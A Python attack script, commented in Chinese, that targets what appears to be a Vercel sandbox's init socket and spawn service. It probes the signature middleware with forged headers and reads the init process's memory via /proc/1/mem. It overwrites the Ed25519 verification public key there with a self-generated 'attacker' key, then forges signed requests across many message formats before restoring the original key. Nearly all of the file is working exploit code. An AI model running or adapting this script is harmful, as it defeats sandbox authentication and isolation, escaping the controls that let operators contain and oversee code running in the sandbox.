# 实验J5: 签名中间件分步诊断 + 时间格式提取 + 消息格式扩展矩阵
# J4 失败原因不明(响应截断) -> 本实验完整读 body, 区分: 头名错/时间格式错/验签失败
import os, re, subprocess, base64, time, socket

def run(cmd, timeout=20):
    try:
        r = subprocess.run(["bash", "-c", cmd], capture_output=True, timeout=timeout)
        return (r.stdout + r.stderr).decode(errors='replace')
    except Exception as e:
        return f"ERR {type(e).__name__}: {e}"

# ---------- [1] 二进制时间格式提取 ----------
print("[1] 二进制 Go 时间格式字符串", flush=True)
data = open("/run/vercel/share/sandbox-init", "rb").read()
for m in re.finditer(rb"2006[-/0-9A-Za-z:\.TZ ]{5,60}", data):
    s = m.group(0)
    if b"2006" in s:
        print(f"  @0x{m.start():x}: {s[:80]!r}", flush=True)
# 也搜 timestamp 相关
for m in re.finditer(rb"timestamp", data):
    ctx = data[max(0, m.start()-40):m.start()+60]
    c = re.sub(rb'[^\x20-\x7e]', b'.', ctx)
    print(f"  ts @0x{m.start():x}: {c.decode(errors='replace')}", flush=True)

# ---------- [2] init.sock 完整响应读取 ----------
print("[2] 分步诊断(完整 body)", flush=True)
def http_unix_full(path, body=b"{}", headers=None, timeout=5):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect("/run/vercel/share/init.sock")
        hdrs = "".join(f"{k}: {v}\r\n" for k, v in (headers or {}).items())
        req = (f"POST {path} HTTP/1.1\r\nHost: localhost\r\n"
               f"Content-Type: application/json\r\nContent-Length: {len(body)}\r\n"
               f"{hdrs}\r\n").encode() + body
        s.sendall(req)
        data = b""
        try:
            while True:
                c = s.recv(4096)
                if not c:
                    break
                data += c
        except socket.timeout:
            pass
        s.close()
        head, _, respbody = data.partition(b"\r\n\r\n")
        status = head.split(b" ")[1].decode() if b" " in head else "?"
        return status, respbody[:300]
    except Exception as e:
        return "ERR", str(e).encode()

P = "/vercel.sandbox.spawn.v1.SpawnService/Ping"
ts_sec = str(int(time.time()))
# 2a: 只带 timestamp
st, rb = http_unix_full(P, headers={"timestamp": ts_sec})
print(f"  2a 仅timestamp      -> {st} {rb!r}", flush=True)
# 2b: 只带 signature
st, rb = http_unix_full(P, headers={"signature": "AAAA"})
print(f"  2b 仅signature      -> {st} {rb!r}", flush=True)
# 2c: 带 signature+timestamp 乱值
st, rb = http_unix_full(P, headers={"signature": "AAAA", "timestamp": ts_sec})
print(f"  2c signature+ts乱值 -> {st} {rb!r}", flush=True)

# ---------- [3] 替换 pubkey + 乱签名诊断 ----------
print("[3] 替换 pubkey 后乱签名诊断", flush=True)
cmdline = run("cat /proc/1/cmdline | tr '\\0' ' '")
m = re.search(r"--pubkey=([A-Za-z0-9+/=]+)", cmdline)
orig_pub = base64.b64decode(m.group(1)) if m else b""
orig_pub_b64 = m.group(1) if m else ""
print(f"  pubkey: {orig_pub_b64}", flush=True)

maps_txt = open("/proc/1/maps").read()
copies_raw = []
copies_b64 = []
for line in maps_txt.splitlines():
    parts = line.split()
    if len(parts) < 2 or parts[1][0] != "r":
        continue
    try:
        a0, a1 = parts[0].split("-")
        start, end = int(a0, 16), int(a1, 16)
    except Exception:
        continue
    try:
        fd = os.open("/proc/1/mem", os.O_RDONLY)
        d = os.pread(fd, min(end - start, 16 * 1024 * 1024), start)
        os.close(fd)
    except Exception:
        continue
    # 原始 32 字节
    idx = 0
    while True:
        i = d.find(orig_pub, idx)
        if i < 0:
            break
        copies_raw.append(start + i)
        idx = i + 1
    # base64 文本
    idx = 0
    while True:
        i = d.find(orig_pub_b64.encode(), idx)
        if i < 0:
            break
        copies_b64.append(start + i)
        idx = i + 1
print(f"  raw 副本: {[hex(c) for c in copies_raw]}", flush=True)
print(f"  b64 副本: {[hex(c) for c in copies_b64]}", flush=True)

run("openssl genpkey -algorithm ED25519 -out /tmp/atk_priv.pem 2>&1")
run("openssl pkey -in /tmp/atk_priv.pem -pubout -outform DER -out /tmp/atk_pub.der 2>&1")
atk_pub = open("/tmp/atk_pub.der", "rb").read()[-32:]
fd = os.open("/proc/1/mem", os.O_RDWR)
backups = []
for off in copies_raw:
    backups.append((off, os.pread(fd, 32, off)))
    os.pwrite(fd, atk_pub, off)
print(f"  已替换 {len(copies_raw)} 处 raw pubkey", flush=True)

def sign(msg: bytes) -> bytes:
    open("/tmp/msg.bin", "wb").write(msg)
    run("openssl pkeyutl -sign -inkey /tmp/atk_priv.pem -rawin -in /tmp/msg.bin -out /tmp/sig.bin 2>&1")
    return open("/tmp/sig.bin", "rb").read()

# 诊断: 用攻击者私钥正确签名(消息=ts) 发请求 -> 若 body 是 invalid signature => 验签执行(公钥替换生效!)
for label, ts_h in [("sec", ts_sec), ("ms", str(int(time.time()*1000))), ("rfc3339", time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))]:
    sig = sign(ts_h.encode())
    st, rb = http_unix_full(P, headers={"signature": base64.b64encode(sig).decode(), "timestamp": ts_h})
    print(f"  3.{label:<8} 消息=ts_h -> {st} {rb!r}", flush=True)

# ---------- [4] 消息格式扩展矩阵 ----------
print("[4] 消息格式扩展矩阵(消息=ts 组合)", flush=True)
ts_variants = [
    ("sec", ts_sec),
    ("ms", str(int(time.time()*1000))),
    ("rfc3339", time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())),
]
body = b"{}"
formats = [
    ("ts", lambda t: t.encode()),
    ("ts+body", lambda t: t.encode() + body),
    ("ts:body", lambda t: t.encode() + b":" + body),
    ("ts+path", lambda t: t.encode() + P.encode()),
    ("POST+ts", lambda t: b"POST" + t.encode()),
    ("POST+path+ts", lambda t: b"POST" + P.encode() + t.encode()),
    ("ts+POST+path+body", lambda t: t.encode() + b"POST" + P.encode() + body),
    ("sha256(ts)", lambda t: __import__("hashlib").sha256(t.encode()).digest()),
    ("ts+sha256(body)", lambda t: t.encode() + __import__("hashlib").sha256(body).digest()),
]
for tlabel, ts_h in ts_variants:
    for flabel, fn in formats:
        msg = fn(ts_h)
        sig = sign(msg)
        st, rb = http_unix_full(P, headers={"signature": base64.b64encode(sig).decode(), "timestamp": ts_h})
        if st != "401":
            print(f"  !!! {tlabel}+{flabel} -> {st} {rb!r} !!!", flush=True)
        else:
            err = rb[2:60]
            if b"invalid signature" in rb:
                err = b"INVALID-SIG"
            elif b"missing" in rb:
                err = rb[:40]
            print(f"  {tlabel}+{flabel:<18} -> 401 [{err}]", flush=True)

# ---------- [5] 恢复 ----------
print("[5] 恢复 pubkey", flush=True)
for off, orig in backups:
    os.pwrite(fd, orig, off)
os.close(fd)
print("done", flush=True)
